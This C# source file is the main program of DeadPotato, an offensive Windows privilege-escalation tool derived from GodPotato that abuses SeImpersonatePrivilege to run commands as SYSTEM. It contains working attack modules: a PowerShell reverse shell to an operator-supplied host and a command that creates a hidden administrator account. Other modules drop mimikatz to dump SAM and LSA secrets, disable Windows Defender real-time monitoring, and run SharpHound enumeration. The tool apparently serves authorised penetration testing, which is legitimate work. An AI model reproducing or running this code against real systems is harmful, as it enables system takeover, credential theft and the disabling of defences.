
// DISCLAIMER:
// This Project "DeadPotato" is a tool built on the source code of the masterpiece "GodPotato" by BeichenDream.
// If you like this project, make sure to also go show support to https://github.com/BeichenDream/GodPotato

using System;
using System.IO;
using DeadPotato.NativeAPI;
using System.Security.Principal;
using SharpToken;
using System.Text.RegularExpressions;
using System.Web;
using System.Reflection;
using System.Linq;
using System.Diagnostics;
using Microsoft.Win32;
using System.Threading;

namespace DeadPotato
{
    internal class Program
    {
        public static bool verbose;
        public static bool isInShell;
        public static string version = "1.2";

        static void Main(string[] args)
        {   

            if (args.Length > 0)
            {
                if (!PrivilegeChecker.IsSeImpersonatePrivilegeEnabled()) 
                {
                    UI.printColor($"(<darkred>-</darkred>) The <darkgray>SeImpersonatePrivilege</darkgray> appears to be <darkred>DISABLED</darkred>.\nDo you want to proceed? (Y/n): ");
                    if (Console.ReadLine().ToLower() != "y") { UI.printColor($"(<darkred>-</darkred>) Exiting..."); Environment.Exit(0); }
                }

                switch(args[0])
                {
                    case "-cmd":

                        if(args.Length == 1)
                        {
                            UI.printColor($"(<darkred>-</darkred>) Unspecified Arguments.\nUsage: <yellow>deadpotato.exe -cmd COMMAND</yellow>.");
                            Environment.Exit(0);
                        }
                        string joinedArguments = "";
                        for(int i = 1; i < args.Length; i++)
                        {
                            joinedArguments += args[i] + " ";
                        }

                        elevateCommand("cmd /c " + joinedArguments);
                        break;

                    case "-exe":

                        if (args.Length == 1)
                        {
                            UI.printColor($"(<darkred>-</darkred>) Unspecified File.\nUsage: <yellow>deadpotato.exe -exe payload.exe</yellow>.");
                            Environment.Exit(0);
                        }

                        if (!File.Exists(args[1]))
                        {
                            UI.printColor($"(<darkred>-</darkred>) The provided file does not exist.\nUsage: <yellow>deadpotato.exe -exe payload.exe</yellow>.");
                            Environment.Exit(0);
                        }

                        elevateCommand(args[1]);

                        break;

                    case "-rev":

                        if (args.Length == 1)
                        {
                            UI.printColor($"(<darkred>-</darkred>) Unspecified Host.\nUsage: <yellow>deadpotato.exe -rev IP:PORT</yellow>.");
                            Environment.Exit(0);
                        }

                        if(args.Length > 2)
                        {
                            UI.printColor($"(<darkred>-</darkred>) Too many arguments.\nUsage: <yellow>deadpotato.exe -rev IP:PORT</yellow>.");
                            Environment.Exit(0);
                        }

                        if (!Regex.IsMatch(args[1], @"^[^:]+:[^:]+$"))
                        {
                            UI.printColor($"(<darkred>-</darkred>) Host is invalid, use the IP:PORT notation.\nUsage: <yellow>deadpotato.exe -rev IP:PORT</yellow>.");
                            Environment.Exit(0);
                        }

                        elevateCommand("powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('" + args[1].Split(':')[0] + "'," + args[1].Split(':')[1] + ");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"");
                        break;


                    case "-newadmin":

                        if (args.Length == 1)
                        {
                            UI.printColor($"(<darkred>-</darkred>) Unspecified New User's Credentials.\nUsage: <yellow>deadpotato.exe -newadmin username:password</yellow>.");
                            UI.printColor($"\n<red>NOTE: On real-world engagements, make sure to specify a strong password to avoid creating weaknesses.</red>");
                            Environment.Exit(0);
                        }

                        if (args.Length > 2)
                        {
                            UI.printColor($"(<darkred>-</darkred>) Too many arguments.\nUsage: <yellow>deadpotato.exe -newadmin username:password</yellow>.");
                            Environment.Exit(0);
                        }

                        if (!Regex.IsMatch(args[1], @"^[^:]+:[^:]+$"))
                        {
                            UI.printColor($"(<darkred>-</darkred>) Credentials are invalid, use the username:password notation.\nUsage: <yellow>deadpotato.exe -newadmin username:password</yellow>.");
                            Environment.Exit(0);
                        }

                        elevateCommand("cmd /c net user " + args[1].Split(':')[0] + " " + args[1].Split(':')[1] + " /add && net localgroup administrators " + args[1].Split(':')[0] + " /add");
                        break;

                    case "-shell":

                        if (args.Length != 1)
                        {
                            UI.printColor($"(<darkred>-</darkred>) This command takes no arguments.\nUsage: <yellow>deadpotato.exe -shell</yellow>");
                            Environment.Exit(0);
                        }

                        UI.printBanner();
                        UI.printColor("\nInteractive mode enabled, write \"<yellow>quit</yellow>\" to exit.");

                        string currentDirectory = Environment.CurrentDirectory;
                        isInShell = true;

                        while (isInShell)
                        {
                            UI.printColor($"\n<darkred>* DeadPotato *</darkred> {currentDirectory}> ");
                            string command = Console.ReadLine();

                            if (command.Trim().ToLower() == "quit")
                            {
                                isInShell = false;
                                continue;
                            }

                            if (command.StartsWith("cd "))
                            {
                                string path = command.Substring(3).Trim();

                                // Handle relative and absolute paths
                                string newDirectory = Path.GetFullPath(Path.Combine(currentDirectory, path));

                                if (Directory.Exists(newDirectory))
                                {
                                    currentDirectory = newDirectory;
                                    Environment.CurrentDirectory = currentDirectory; // Update the current directory
                                }
                                else
                                {
                                    UI.printColor("\n<darkred>* DeadPotato *</darkred> The directory does not exist.");
                                }
                            }
                            else
                            {
                                elevateCommand($"cmd /c cd {currentDirectory} && " + command);
                            }
                        }

                        UI.printColor($"(<darkred>*</darkred>) Shell was exited.");
                        Environment.Exit(0);
                        break;

                    
                    case "-mimi":

                        if (args.Length != 2 || (args[1] != "sam" && args[1] != "lsa" && args[1] != "secrets"))
                        {
                            UI.printColor($"(<darkred>-</darkred>) This command takes one of these three arguments: <yellow>sam</yellow>, <yellow>lsa</yellow> or <yellow>secrets</yellow> \nUsage: <yellow>deadpotato.exe -mimi sam</yellow>");
                            Environment.Exit(0);
                        }

                        UI.printBanner();

                        string fileName = new string(Enumerable.Range(0, 8).Select(_ => "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"[new Random(Guid.NewGuid().GetHashCode()).Next(62)]).ToArray())  + ".exe";
                        UI.printColor($"(<darkred>*</darkred>) Attempting to write <darkgray>{fileName}</darkgray> (mimikatz) in the current directory...");

                        try
                        {
                            File.WriteAllBytes(fileName, Properties.Resources.mimikatz);
                            UI.printColor($"\n(<darkgreen>+</darkgreen>) File written. Attempting to dump SAM...\n\n");
                            elevateCommand($"{fileName} privilege::debug \"lsadump::{args[1]}\" exit", false);
                            UI.printColor($"\n(<darkgreen>+</darkgreen>) Removing mimikatz and exiting.");
                            File.Delete(fileName);
                        }
                        catch
                        {
                            UI.printColor($"\n(<darkred>-</darkred>) An error occurred. Exiting.");
                            Environment.Exit(0);
                        }

                        break;


                    case "-defender":

                        if (args.Length != 2)
                        {
                            UI.printColor($"(<darkred>-</darkred>) This command takes either <yellow>on</yellow>, <yellow>off</yellow> or <yellow>status</yellow> as arguments.\nUsage: <yellow>deadpotato.exe -defender off</yellow>");
                            Environment.Exit(0);
                        }

                        if (args[1].ToLower() != "on" && args[1].ToLower() != "off" && args[1].ToLower() != "status")
                        {
                            UI.printColor($"(<darkred>-</darkred>) This command takes either <yellow>on</yellow> or <yellow>off</yellow> as arguments.\nUsage: <yellow>deadpotato.exe -defender off</yellow>");
                            Environment.Exit(0);
                        }

                        UI.printBanner();

                        if (args[1].ToLower() == "status")
                        {
                            UI.printColor($"(<darkred>*</darkred>) Running status checks...");
                            UI.printColor($"\n(<darkred>*</darkred>) Windows Defender seems to be {(isWindowsDefenderRunning() ? "<darkgreen>ENABLED</darkgreen>" : "<darkred>DISABLED</darkred>")}. Exiting.\n");
                            Environment.Exit(0);
                        }

                        bool enabled = (args[1].ToLower() == "on");

                        if(Process.GetProcessesByName("MsMpEng").Length == 0)
                        {
                            UI.printColor($"\n(<darkred>-</darkred>) Windows Defender does not seem to be running.");
                            Environment.Exit(0);
                        }

                        UI.printColor($"(<darkred>*</darkred>) Attempting to {(enabled ? "ENABLE" : "DISABLE")} Windows Defender...\n");

                        elevateCommand($"powershell -ExecutionPolicy Bypass -Command \"Set-MpPreference -DisableRealtimeMonitoring {(enabled ? "$false" : "$true")}\"", false);

                        UI.printColor($"(<darkred>*</darkred>) Running status checks...");
                        UI.printColor($"\n(<darkred>*</darkred>) Windows Defender seems to be {(isWindowsDefenderRunning() ? "<darkgreen>ENABLED</darkgreen>" : "<darkred>DISABLED</darkred>")}. Exiting.\n");
                        Environment.Exit(0);
                        break;


                    case "-sharphound":

                        if (args.Length != 1)
                        {
                            UI.printColor($"(<darkred>-</darkred>) This command takes no arguments.\nUsage: <yellow>deadpotato.exe -sharphound</yellow>");
                            Environment.Exit(0);
                        }

                        UI.printBanner();

                        string fileName2 = new string(Enumerable.Range(0, 8).Select(_ => "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"[new Random(Guid.NewGuid().GetHashCode()).Next(62)]).ToArray()) + ".exe";
                        UI.printColor($"(<darkred>*</darkred>) Attempting to write <darkgray>{fileName2}</darkgray> (SharpHound) in the current directory...");

                        try
                        {
                            File.WriteAllBytes(fileName2, Properties.Resources.SharpHound);
                            UI.printColor($"\n(<darkgreen>+</darkgreen>) File written. Attempting to run enumeration...\n\n");
                            elevateCommand($"{fileName2} -c All", false);
                            UI.printColor($"\n(<darkgreen>+</darkgreen>) Removing SharpHound and exiting.");
                            Thread.Sleep(1000);
                            File.Delete(fileName2);
                        }
                        catch
                        {
                            UI.printColor($"\n(<darkred>-</darkred>) An error occurred. Exiting.");
                            Environment.Exit(0);
                        }

                        break;


                    default:
                        UI.printColor($"(<darkred>-</darkred>) Invalid module: \"<yellow>{args[0]}</yellow>\".\nChoose between <yellow>-cmd</yellow>, <yellow>-rev</yellow>, and the following listed in the help page below:");
                        UI.printHelp();
                        Environment.Exit(0);
                        break;
                }
            }
            else { UI.printHelp(); Environment.Exit(0); }
               
            

        }

        public static void WriteResourceToFile(string resourceName, string fileName)
        {
            var assembly = Assembly.GetExecutingAssembly();
            using (Stream resourceStream = assembly.GetManifestResourceStream(resourceName))
            {
                if (resourceStream == null)
                {
                    throw new ArgumentException($"Resource '{resourceName}' not found.");
                }

                using (FileStream fileStream = new FileStream(fileName, FileMode.Create, FileAccess.Write))
                {
                    resourceStream.CopyTo(fileStream);
                }
            }
        }

        public static bool isWindowsDefenderRunning()
        {
            var path = @"SOFTWARE\Microsoft\Windows Defender\Real-Time Protection";
            var key = "DisableRealtimeMonitoring";
            var regkey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64);
            if (regkey != null)
            {
                var subkey = regkey.OpenSubKey(path);
                var val = subkey.GetValue(key);
                if (val != null && val is Int32)
                {
                    var value = (int)val;
                    if (value == 1)
                    {
                        return false;
                    }
                    else
                    {
                        return true;
                    }
                }
                else
                {
                    return true;
                }
            }
            else
            {
                return false;
            }
        }

        public static void elevateCommand(string command, bool displayBanner = true)
        {
            TextWriter ConsoleWriter = Console.Out;

            try
            {
                if (!Program.isInShell && displayBanner) UI.printBanner();
                GodPotatoContext godPotatoContext = new GodPotatoContext(ConsoleWriter, Guid.NewGuid().ToString());

                if (verbose)
                {
                    ConsoleWriter.WriteLine("[*] CombaseModule: 0x{0:x}", godPotatoContext.CombaseModule);
                    ConsoleWriter.WriteLine("[*] DispatchTable: 0x{0:x}", godPotatoContext.DispatchTablePtr);
                    ConsoleWriter.WriteLine("[*] UseProtseqFunction: 0x{0:x}", godPotatoContext.UseProtseqFunctionPtr);
                    ConsoleWriter.WriteLine("[*] UseProtseqFunctionParamCount: {0}", godPotatoContext.UseProtseqFunctionParamCount);
                    ConsoleWriter.WriteLine("[*] HookRPC");
                }

                godPotatoContext.HookRPC();

                if (verbose) { ConsoleWriter.WriteLine("[*] Start PipeServer"); }

                godPotatoContext.Start();

                GodPotatoUnmarshalTrigger unmarshalTrigger = new GodPotatoUnmarshalTrigger(godPotatoContext);
                try
                {
                    if (verbose) { ConsoleWriter.WriteLine("[*] Trigger RPCSS"); }
                    int hr = unmarshalTrigger.Trigger();
                    if (verbose) { ConsoleWriter.WriteLine("[*] UnmarshalObject: 0x{0:x}", hr); }

                }
                catch (Exception e)
                {
                    ConsoleWriter.WriteLine(e);
                }


                WindowsIdentity systemIdentity = godPotatoContext.GetToken();
                if (systemIdentity != null)
                {
                    if(!isInShell) UI.printColor("\n(" + (systemIdentity.Name.ToString() == @"NT AUTHORITY\SYSTEM" ? "<darkgreen>+</darkgreen>" : "<darkred>-</darkred>") + ") Currently running as user: " + (systemIdentity.Name.ToString() == @"NT AUTHORITY\SYSTEM" ? $"<darkgreen>{systemIdentity.Name}</darkgreen>" : $"<darkred>{systemIdentity.Name}</darkred>"));
                    TokenuUils.createProcessReadOut(ConsoleWriter, systemIdentity.Token, command);

                }
                else
                {
                    ConsoleWriter.WriteLine("[!] Failed to impersonate security context token");
                }
                godPotatoContext.Restore();
                godPotatoContext.Stop();
            }
            catch (Exception e)
            {
                ConsoleWriter.WriteLine("[!] " + e.Message);

            }
        }
    }
}
